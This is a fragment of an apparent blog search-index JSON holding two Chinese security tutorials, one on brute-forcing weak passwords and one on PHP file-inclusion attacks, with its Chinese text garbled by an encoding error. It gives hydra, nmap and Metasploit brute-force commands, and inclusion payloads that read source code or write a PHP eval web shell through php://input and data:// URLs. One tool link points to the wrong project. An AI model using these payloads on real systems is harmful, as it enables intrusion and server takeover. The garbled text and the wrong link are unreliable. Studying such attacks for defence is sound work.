123*.googletagmanager.com*.google-analytics.com*.translate.googleapis.com","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"å¼±å£ä»¤æ”»å‡»æ–¹å¼","slug":"å¸¸è§å¼±å£ä»¤æ”»å‡»æ–¹å¼","date":"2022-09-27T17:16:58.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/09/28/å¸¸è§å¼±å£ä»¤æ”»å‡»æ–¹å¼/","permalink":"https://gryffinbit.top/2022/09/28/%E5%B8%B8%E8%A7%81%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"ç«¯å£æœåŠ¡æ‰«æè„šæœ¬impacket-0.10.0 Impacketæ˜¯ç”¨äºå¤„ç†ç½‘ç»œåè®®çš„Pythonç±»çš„é›†åˆã€‚Impacketä¸“æ³¨äºæä¾›å¯¹æ•°æ®åŒ…çš„ç®€å•ç¼–ç¨‹è®¿é—®ï¼Œä»¥åŠåè®®å®ç°æœ¬èº«çš„æŸäº›åè®®ï¼ˆä¾‹å¦‚SMB1-3å’ŒMSRPCï¼‰ã€‚æ•°æ®åŒ…å¯ä»¥ä»å¤´å¼€å§‹æ„å»ºï¼Œä¹Ÿå¯ä»¥ä»åŸå§‹æ•°æ®ä¸­è§£æï¼Œè€Œé¢å‘å¯¹è±¡çš„APIä½¿å¤„ç†åè®®çš„æ·±å±‚æ¬¡ç»“æ„å˜å¾—ç®€å•ã€‚è¯¥åº“æä¾›äº†ä¸€ç»„å·¥å…·ï¼Œä½œä¸ºåœ¨æ­¤åº“æ‰¾åˆ°å¯ä»¥æ‰§è¡Œçš„æ“ä½œçš„ç¤ºä¾‹ åŒ…å«çš„åè®®ï¼š ä»¥å¤ªç½‘ï¼ŒLinuxâ€œCookedâ€æ•°æ®åŒ…æ•è· IPï¼ŒTCPï¼ŒUDPï¼ŒICMPï¼ŒIGMPï¼ŒARP æ”¯æŒIPv4å’ŒIPv6 NMBå’ŒSMB1ï¼ŒSMB2å’ŒSMB3ï¼ˆé«˜çº§å®ç°ï¼‰ MSRPCç‰ˆæœ¬5ï¼Œé€šè¿‡ä¸åŒçš„ä¼ è¾“åè®®ï¼šTCPï¼ŒSMB &#x2F; TCPï¼ŒSMB&#x2F;NetBIOSå’ŒHTTP ä½¿ç”¨å¯†ç &#x2F;å“ˆå¸Œ&#x2F;ç¥¨æ®&#x2F;å¯†é’¥è¿›è¡Œç®€å•çš„NTLMå’ŒKerberosèº«ä»½éªŒè¯ éƒ¨åˆ†æˆ–å®Œå…¨å®ç°ä»¥ä¸‹MSRPCæ¥å£ï¼šEPMï¼ŒDTYPESï¼ŒLSADï¼ŒLSATï¼ŒNRPCï¼ŒRRPï¼ŒSAMRï¼ŒSRVSï¼ŒWKSTï¼ŒSCMRï¼ŒBKRPï¼ŒDHCPMï¼ŒEVEN6ï¼ŒMGMTï¼ŒSASECï¼ŒTSCHï¼ŒDCOMï¼ŒWMI éƒ¨åˆ†TDSï¼ˆMSSQLï¼‰å’ŒLDAPåè®®å®ç°ã€‚ impacketä¸€äº›ç”¨æ³•è¯´æ˜ï¼š https://www.cnblogs.com/backlion/p/10676339.html GitHubé¡¹ç›® https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_10_0 Webå¼±å£ä»¤ å³é»‘å®¢é€šè¿‡å·²æœ‰çš„å¤§é‡è´¦å·ä¿¡æ¯ï¼Œå¿«é€Ÿæ‰¹é‡éªŒè¯èƒ½å¤Ÿè®¿é—®ç›®æ ‡Webèµ„äº§çš„è´¦å·ã€‚è¿™ç§æ”»å‡»æ–¹å¼ç”±äºåˆ©ç”¨éš¾åº¦ä¸å¤§ï¼Œä¸”ä¸€æ—¦è·å–åˆ°ç›®æ ‡ç³»ç»Ÿçš„å¼±å£ä»¤è¿›å…¥ç›®æ ‡Webç³»ç»Ÿï¼Œå¯ä»¥æ‰©å¤§æ”»å‡»è€…çš„æ”»å‡»èŒƒå›´ï¼Œè¢«å¹¿ä¸ºä½¿ç”¨ã€‚ æ”»å‡»åœºæ™¯ ä¸ºäº†è·å–ç›®æ ‡åº”ç”¨çš„è®¿é—®æƒé™ï¼Œå¯¹è´¦å·(å¦‚Adminã€Rootç­‰)çš„å¯†ç è¿›è¡Œå°è¯•ï¼› ä¸ºäº†è·å–åˆ°ç›®æ ‡ç³»ç»Ÿçš„ç”¨æˆ·ç¾¤ä½“ä¿¡æ¯ï¼Œå¦‚é€šè¿‡å¯¹å¤§é‡æ‰‹æœºå·çš„å°è¯•ç™»å½•ï¼Œç¢°æ’ç›®æ ‡ç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„ç”¨æˆ·ç¾¤ä½“ï¼Œå¹¶å¯¹ç¢°æ’å‡ºçš„ç”¨æˆ·ç¾¤ï¼Œè¿›è¡Œæœ‰é’ˆå¯¹æ€§çš„å•†ä¸šæ´»åŠ¨ã€‚ æ”»å‡»æ‰‹æ³• å­—å…¸æ”»å‡»çˆ†ç ´ burpsuite åˆ©ç”¨shodanç­‰æœç´¢å¼•æ“ï¼ŒæŸ¥æ‰¾ç½‘ç»œç©ºé—´ä¸­åœ¨çº¿çš„è®¾å¤‡ï¼Œæ ¹æ®ipåœ°å€è®¿é—®åå¯å°è¯•å¼±å£ä»¤ç™»é™† å‡†å¤‡å­—å…¸ ç¤¾å·¥å­—å…¸ç”Ÿæˆå™¨ï¼šKali ä¸‹çš„å·¥å…·Cupp å¼±å£ä»¤ç ´è§£è„šæœ¬ï¼Œæ‰¹é‡æ£€æµ‹æ²¡æœ‰éªŒè¯ç çš„ç®¡ç†åå°ï¼šhttps://github.com/TideSec/web_pwd_common_crack ç”¨æˆ·åå­—å…¸ï¼šhttps://github.com/TheKingOfDuck/fuzzDicts/tree/master/userNameDict å¯†ç å­—å…¸ï¼šhttps://github.com/TheKingOfDuck/fuzzDicts/tree/master/passwordDict SSHå¼±å£ä»¤ SSHï¼Œè¿œç¨‹ç™»å½• æ”»å‡»åœºæ™¯ é€šå¸¸sshä¼šè¿œç¨‹ç™»å½•æ“ä½œLinuxæœåŠ¡å™¨ æ”»å‡»æ‰‹æ®µ nmapçˆ†ç ´ 1nmap -p 22 --script=ssh-brute --script-args userdb=ç”¨æˆ·å­—å…¸,passdb=å¯†ç å­—å…¸ ç›®æ ‡æœºip hydra çˆ†ç ´ https://github.com/facebookresearch/hydra kaliä¸­è‡ªå¸¦ è¯¥å·¥å…·æ”¯æŒçš„åè®®ï¼š AFPï¼ŒCisco AAAï¼ŒCiscoèº«ä»½éªŒè¯ï¼ŒCiscoå¯ç”¨ï¼ŒCVSï¼ŒFirebirdï¼ŒFTPï¼ŒHTTP-FORM-GETï¼ŒHTTP-FORM-POSTï¼ŒHTTP-GETï¼ŒHTTP-HEADï¼ŒHTTP-PROXYï¼ŒHTTPS-FORM- GETï¼ŒHTTPS-FORM-POSTï¼ŒHTTPS-GETï¼ŒHTTPS-HEADï¼ŒHTTP-Proxyï¼ŒICQï¼ŒIMAPï¼ŒIRCï¼ŒLDAPï¼ŒMS-SQLï¼ŒMYSQLï¼ŒNCPï¼ŒNNTPï¼ŒOracle Listenerï¼ŒOracle SIDï¼ŒOracleï¼ŒPC-Anywhereï¼Œ PCNFSï¼ŒPOP3ï¼ŒPOSTGRESï¼ŒRDPï¼ŒRexecï¼ŒRloginï¼ŒRshï¼ŒSAP &#x2F; R3ï¼ŒSIPï¼ŒSMBï¼ŒSMTPï¼ŒSMTPæšä¸¾ï¼ŒSNMPï¼ŒSOCKS5ï¼ŒSSHï¼ˆv1å’Œv2ï¼‰ï¼ŒSubversionï¼ŒTeamspeakï¼ˆTS2ï¼‰ï¼ŒTelnetï¼ŒVMware-Auth ï¼ŒVNCå’ŒXMPPã€‚ å¯¹äº HTTPï¼ŒPOP3ï¼ŒIMAPå’ŒSMTPï¼Œæ”¯æŒå‡ ç§ç™»å½•æœºåˆ¶ï¼Œå¦‚æ™®é€šå’ŒMD5æ‘˜è¦ç­‰ã€‚ 1hydra -l root -P ssh_password.txt ç›®æ ‡æœºip ssh -v msf ssh_loginæ¨¡å—æš´åŠ›ç ´è§£sshå¯†ç  12msf &gt; use auxiliary/scanner/ssh/ssh_loginshow options FTPå¼±å£ä»¤ FTP å¼±å£ä»¤æˆ–åŒ¿åç™»å½•æ¼æ´ï¼Œä¸€èˆ¬æŒ‡ä½¿ç”¨ FTP çš„ç”¨æˆ·å¯ç”¨äº†åŒ¿åç™»å½•åŠŸèƒ½ï¼Œæˆ–ç³»ç»Ÿå£ä»¤çš„é•¿åº¦å¤ªçŸ­ã€å¤æ‚åº¦ä¸å¤Ÿã€ä»…åŒ…å«æ•°å­—ã€æˆ–ä»…åŒ…å«å­—æ¯ç­‰ï¼Œå®¹æ˜“è¢«é»‘å®¢æ”»å‡»ï¼Œå‘ç”Ÿæ¶æ„æ–‡ä»¶ä¸Šä¼ æˆ–æ›´ä¸¥é‡çš„å…¥ä¾µè¡Œä¸ºã€‚ Msf ftp_login æ¨¡å—æš´åŠ›ç ´è§£ftpå¯†ç  12msf &gt; use ftp_loginshow options hydra 1hydra -l user -p root ftp://ip bruter RDPå¼±å£ä»¤ RDPè¿œç¨‹æ¡Œé¢åè®®ï¼Œåªéœ€è¦ä¸»æœºçš„è´¦æˆ·ä¸å¯†ç ï¼Œå³å¯è®¿é—®ä¸»æœºå†…èµ„æºï¼Œå¤šç”¨äºè¿œç¨‹ååŠ©ä¸è¿œç¨‹è¿ç»´ hydra Msf æ•°æ®åº“å¼±å£ä»¤1msf &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump TOMCATå¼±å£ä»¤ msf https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-TomcatScan%E6%A8%A1%E5%9D%97Tomcat%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B burpsuite å‚è€ƒæ–‡ç« https://www.wangan.com/articles/2173 https://www.wangan.com/articles/2173#064b3d","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"æ–‡ä»¶åŒ…å«æ¼æ´åŸç†åŠå¸¸è§æ”»å‡»æ–¹å¼","slug":"æ–‡ä»¶åŒ…å«æ¼æ´åŸç†åŠå¸¸è§æ”»å‡»æ–¹å¼","date":"2022-09-26T16:49:21.000Z","updated":"2024-11-12T07:00:00.000Z","comments":true,"path":"2022/09/27/æ–‡ä»¶åŒ…å«æ¼æ´åŸç†åŠå¸¸è§æ”»å‡»æ–¹å¼/","permalink":"https://gryffinbit.top/2022/09/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"ä»‹ç» å³file inclusionï¼Œæ„æ€æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæ˜¯æŒ‡å½“æœåŠ¡å™¨å¼€å¯allow_url_includeé€‰é¡¹æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡PHPçš„æŸäº›ç‰¹æ€§å‡½æ•°ï¼ˆinclude()ï¼Œrequire()å’Œinclude_once()ï¼Œrequir_once()ï¼‰åˆ©ç”¨URLå»åŠ¨æ€åŒ…å«æ–‡ä»¶ï¼Œæ­¤æ—¶å¦‚æœæ²¡æœ‰å¯¹æ–‡ä»¶æ¥æºè¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå°±ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´æ˜¯å› ä¸ºå¼€å¯äº†PHPé…ç½®ä¸­çš„allow_url_fopené€‰é¡¹ï¼Œé€‰é¡¹å¼€å¯ä¹‹åï¼ŒæœåŠ¡å™¨å…è®¸åŒ…å«ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶ï¼ŒæœåŠ¡å™¨é€šè¿‡PHPç‰¹æ€§ï¼ˆå‡½æ•°ï¼‰å»åŒ…å«ä»»æ„æ–‡ä»¶æ—¶ï¼Œç”±äºè¦åŒ…å«çš„è¿™ä¸ªæ–‡ä»¶æ¥æºè¿‡æ»¤ä¸ä¸¥ï¼Œä»è€Œå¯ä»¥å»åŒ…å«ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ„é€ è¿™ä¸ªæ¶æ„æ–‡ä»¶æ¥è¾¾åˆ°è‡ªå·±çš„ç›®çš„ã€‚ æ–‡ä»¶åŒ…å«å³ç¨‹åºé€šè¿‡åŒ…å«å‡½æ•°è°ƒç”¨æœ¬åœ°æˆ–è¿œç¨‹æ–‡ä»¶ï¼Œä»¥æ­¤æ¥å®ç°æ‹“å±•åŠŸèƒ½ è¢«åŒ…å«çš„æ–‡ä»¶å¯ä»¥æ˜¯å„ç§æ–‡ä»¶æ ¼å¼ï¼Œè€Œå½“æ–‡ä»¶é‡Œé¢åŒ…å«æ¶æ„ä»£ç ï¼Œåˆ™ä¼šå½¢æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæˆ–æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´ä¸»è¦å‘ç”Ÿåœ¨æœ‰åŒ…å«è¯­å¥çš„ç¯å¢ƒä¸­ï¼Œä¾‹å¦‚PHPæ‰€å…·å¤‡includeã€requireç­‰å‡½æ•°ã€‚ æœ¬åœ°æ–‡ä»¶åŒ…å«LFIï¼ˆlocal file includeï¼‰å½“è¢«åŒ…å«çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨æœ¬åœ°æ—¶ï¼Œå°±å½¢æˆæœ¬åœ°æ–‡ä»¶åŒ…å« è¿œç¨‹æ–‡ä»¶åŒ…å«RFIï¼ˆremote file includeï¼‰å½“è¢«åŒ…å«çš„æ–‡ä»¶åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡å™¨æ—¶ï¼Œå«åšè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚ PHPæ–‡ä»¶åŒ…å«çš„å‡½æ•°include( ) ï¼š å½“ä½¿ç”¨è¯¥å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ° include()å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶ç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ include_once( ) : åŠŸèƒ½ä¸ Include()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ require( ) require()ä¸ include()çš„åŒºåˆ«ï¼š require()æ‰§è¡Œå¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œã€‚ require_once( )ä¸ require() åŒºåˆ«ï¼šrequire_once( ) åŠŸèƒ½ä¸ require()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ è¿œç¨‹æ–‡ä»¶åŒ…å« å½“åŒ…å«çš„æ–‡ä»¶åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ—¶ï¼Œå°±å½¢æˆäº†è¿œç¨‹æ–‡ä»¶åŒ…å« è¿œç¨‹æ–‡ä»¶åŒ…å«çš„æ³¨æ„ç‚¹ï¼š éœ€è¦php.iniä¸­allow_url_include = onä»¥åŠallow_url_fopen=on æ‰€åŒ…å«è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶åç¼€ä¸èƒ½ä¸ç›®æ ‡æœåŠ¡å™¨è¯­è¨€ç›¸åŒã€‚(æ¯”å¦‚ç›®æ ‡æœåŠ¡å™¨æ˜¯phpè„šæœ¬è¯­è¨€è§£æçš„ï¼Œ é‚£ä¹ˆåŒ…å«çš„è¿œç¨‹æœåŠ¡å™¨æ–‡ä»¶åç¼€ä¸èƒ½æ˜¯php) è¿œç¨‹æ–‡ä»¶åŒ…å«å¦‚æœPHPçš„é…ç½®é€‰é¡¹allow_url_includeä¸ºONçš„è¯ï¼Œåˆ™include/requireå‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´ç§°ä¸ºè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ æœ¬åœ°æ–‡ä»¶åŒ…å«èƒ½è¿‡æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œè¢«ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åªèƒ½æŸ¥çœ‹æˆ–è¿è¡Œæœ¬åœ°æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PHPçš„ä¼ªåè®®ç­‰æ–¹å¼æ¥åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ¥ä¸‹æ¥è®²çš„æ˜¯å¦‚ä¸‹å‡ ç§åˆ©ç”¨æ–¹å¼ï¼š PHPä¼ªåè®®ï¼ˆè¾ƒä¸ºé€šç”¨ï¼‰ åŒ…å«Sessionæ–‡ä»¶ åŒ…å«æ—¥å¿—ï¼ˆè¾ƒä¸ºé€šç”¨ï¼‰ åŒ…å«environæ–‡ä»¶ åŒ…å«ä¸´æ—¶æ–‡ä»¶ åŒ…å«ä¸Šä¼ æ–‡ä»¶ ä¼ªåè®®php:&#x2F;&#x2F;åè®®12php://inputphp://filter php:&#x2F;&#x2F;inputç”¨äºæ‰§è¡ŒPHPä»£ç ï¼Œphp:&#x2F;&#x2F;filterç”¨äºè¯»å–æºç ã€‚ php:&#x2F;&#x2F;filter ğŸ‘‡ php:&#x2F;&#x2F;filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚ç®€å•æ¥è®²å°±æ˜¯å¯ä»¥åœ¨æ‰§è¡Œä»£ç å‰å°†ä»£ç æ¢ä¸ªæ–¹å¼è¯»å–å‡ºæ¥ï¼Œåªæ˜¯è¯»å–ï¼Œä¸éœ€è¦å¼€å¯allow_url_includeã€‚ ç”¨æ³•ï¼š 1?file=php://filter/convert.base64-encode/resource=xxx.php é¡µé¢æºä»£ç ä¸ºindex.php 12url: http://localhost/test/index.php?file=php://filter/read=convert.base64-encode/resource=index.phpresult: PD9waHAgc3lzdGVtKCdpcGNvbmZpZycpOz8+ base64è§£å¯†å°±å¯ä»¥çœ‹åˆ°å†…å®¹ï¼Œè¿™é‡Œå¦‚æœä¸è¿›è¡Œbase64_encodeï¼Œåˆ™è¢«includeè¿›æ¥çš„ä»£ç å°±ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´çœ‹ä¸åˆ°æºä»£ç ã€‚ base64å†…å®¹ï¼š&lt;?php system(&#39;ipconfig&#39;);?&gt; php:&#x2F;&#x2F;input ğŸ‘‡ php:&#x2F;&#x2F;inputåè®®ä¸»è¦ç”¨äºè®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµã€‚CTFä¸­ç»å¸¸ä½¿ç”¨file_get_contentsè·å–php:&#x2F;&#x2F;inputå†…å®¹(POST)ï¼Œéœ€è¦å¼€å¯allow_url_includeï¼Œå¹¶ä¸”å½“enctype=&quot;multipart/form-data&quot;çš„æ—¶å€™ php:&#x2F;&#x2F;inputæ˜¯æ— æ•ˆçš„ã€‚ åˆ©ç”¨æ–¹å¼ï¼š?file=php://input æ•°æ®åˆ©ç”¨POSTä¼ è¿‡å» ç¢°åˆ°file_get_contents()å°±è¦æƒ³åˆ°ç”¨php:&#x2F;&#x2F;inputç»•è¿‡ï¼Œå› ä¸ºphpä¼ªåè®®ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨httpåè®®çš„ï¼Œå³å¯ä»¥ä½¿ç”¨POSTæ–¹å¼ä¼ æ•°æ®ã€‚ é¡µé¢æºä»£ç  123456&lt;?php$file = $_GET[&#x27;file&#x27;];if (@file_get_content($file) == &#x27;meizijiu&#x27;) &#123; echo $flag;&#125;?&gt; postæ•°æ®ï¼ˆåˆ©ç”¨hackbarï¼‰ 1http://xxxx/?file=php://input postçš„æ•°æ®ä¸ºmeizijiu æˆ–è€…å†™å…¥ä¸€å¥è¯ 12345http://www.inc.com/inc.php?file=php://inputpostæ•°æ®:&lt;?php echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));?&gt; base64å†…å®¹ï¼š&lt;?php eval($_POST[&#39;cc&#39;])?&gt; data:&#x2F;&#x2F;åè®® php.iniï¼šallow_url_include&#x3D;Onã€allow_url_fopen()éƒ½ä¸ºOn åˆ©ç”¨data:&#x2F;&#x2F;ä¼ªåè®®è¿›è¡Œä»£ç æ‰§è¡Œçš„æ€è·¯åŸç†å’Œphp:&#x2F;&#x2F;æ˜¯ç±»ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨äº†PHPä¸­çš„æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ã€‚ é¡µé¢ç¤ºä¾‹ä»£ç ï¼š 123456789&lt;?phpecho &#x27;for test&#x27;;include($_GET[&#x27;file&#x27;]);?&gt;http://www.inc.com/inc.php?file=data://text/plain,&lt;?php phpinfo()?&gt;http://www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=http://www.inc.com/inc.php?file=data:text/plain,&lt;?php phpinfo()?&gt;http://www.inc.com/inc.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=http://www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs/Pg== æœ€åä¸€ä¸ªbase64å†…å®¹ä¸º 123&lt;?php echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));?&gt; æœ€åä¸€ä¸ªURLä½¿ç”¨file_put_contents()å‡½æ•°å°†&lt;?php eval($_POST[&#39;cc&#39;])?&gt;å†™åˆ°äº†test.phpæ–‡ä»¶å½“ä¸­ phar:&#x2F;&#x2F;åè®® phpç‰ˆæœ¬ â‰¥ 5.3 phar:&#x2F;&#x2F;ï¼šPHP å½’æ¡£ï¼Œå¸¸å¸¸è·Ÿæ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶ä¸Šä¼ ç»“åˆç€è€ƒå¯Ÿã€‚å½“æ–‡ä»¶ä¸Šä¼ ä»…ä»…æ ¡éªŒmimeç±»å‹ä¸æ–‡ä»¶åç¼€ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œåˆ©ç”¨ã€‚ åˆ©ç”¨æ–¹å¼ï¼šå†™å…¥ä¸€å¥è¯shell.php -&gt; å‹ç¼©ä¸ºshell.zip -&gt; ä¿®æ”¹åç¼€ä¸ºshell.jpg -&gt;ä¸Šä¼ åˆ°ç½‘ç«™ -&gt; phar:&#x2F;&#x2F;shell.jpg&#x2F;shell.php å‡è®¾æœ‰ä¸ªæ–‡ä»¶phpinfo.txtï¼Œå…¶å†…å®¹ä¸º&lt;?php phpinfo(); ?&gt;ï¼Œæ‰“åŒ…æˆzipå‹ç¼©åŒ…ï¼Œå¦‚ä¸‹ï¼š æŒ‡å®šç»å¯¹è·¯å¾„ï¼š 1index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt zip:&#x2F;&#x2F;åè®® phpç‰ˆæœ¬ â‰¥ 5.3 åˆ©ç”¨å’Œæ„é€ zipåŒ…çš„æ–¹æ³•åŒphar:&#x2F;&#x2F;åè®®ï¼Œä½†ä½¿ç”¨zipåè®®ï¼Œéœ€è¦æŒ‡å®šç»å¯¹è·¯å¾„ï¼ŒåŒæ—¶å°†#ç¼–ç ä¸º%23ï¼Œä¹‹åå¡«ä¸Šå‹ç¼©åŒ…å†…çš„æ–‡ä»¶ã€‚ 1index.php?file=zip://D:\\phpStudy\\WWW\\fileinclude\\test.zip%23phpinfo.txt åŒ…å«sessionæ–‡ä»¶å‰ææ¡ä»¶ï¼šSessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹çš„éƒ¨åˆ†å¯æ§ã€‚ é¦–å…ˆç¬¬ä¸€ä¸ªæ¡ä»¶ï¼šSessionçš„æ–‡ä»¶è·¯å¾„å¯ä»¥åœ¨php.iniä¸­çš„session.save_pathæŸ¥çœ‹åˆ°ï¼š ä¸€èˆ¬è€Œè¨€ï¼Œsessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ä¸ºï¼š &#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID &#x2F;tmp&#x2F;sess_PHPSESSID &#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID åŒ…å«æ—¥å¿—æ–‡ä»¶å‰ææ¡ä»¶ï¼šè¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»ã€‚ æœåŠ¡å™¨ä¸€èˆ¬å›åœ¨Web Serverçš„access_logé‡Œè®°å½•å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ï¼Œåœ¨error_logé‡Œè®°å½•å‡ºé”™ä¿¡æ¯ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥é—´æ¥åœ°å°†PHPä»£ç å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶åŒ…å«æ—¶ï¼Œåªéœ€è¦åŒ…å«æ—¥å¿—æ–‡ä»¶å³å¯ã€‚ ä½†å¦‚æœæ˜¯ç›´æ¥å‘èµ·è¯·æ±‚ï¼Œä¼šå¯¼è‡´ä¸€äº›ç¬¦å·è¢«ç¼–ç ä½¿å¾—åŒ…å«æ— æ³•æ­£ç¡®è§£æã€‚å¯ä»¥ä½¿ç”¨burpæˆªåŒ…åä¿®æ”¹ã€‚ ä¾‹å¦‚å°†PHPä»£ç å†™å…¥ /var/log/apache2/access.logã€‚ç„¶åè¿›è¡ŒåŒ…å«å³å¯ã€‚ åŒ…å«environæ–‡ä»¶/proc/self/environæ–‡ä»¶é‡Œé¢æœ‰Webè¿›ç¨‹è¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­å¾ˆå¤šéƒ½æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæœ€å¸¸è§çš„åšæ³•å°±æ˜¯åœ¨User-Agentä¸­æ³¨å…¥PHPä»£ç ã€‚ åŒ…å«ä¸´æ—¶æ–‡ä»¶ä»¥ä¸Šè¿™äº›æ–¹æ³•éƒ½è¦æ±‚PHPèƒ½è¿‡åŒ…å«è¿™äº›ä¸å¤„äºWebç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚æœPHPè®¾ç½®äº†open_basedirï¼Œåˆ™å¾ˆå¯èƒ½ä¼šä½¿å¾—æ”»å‡»å¤±æ•ˆã€‚ phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\\winsdows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚ 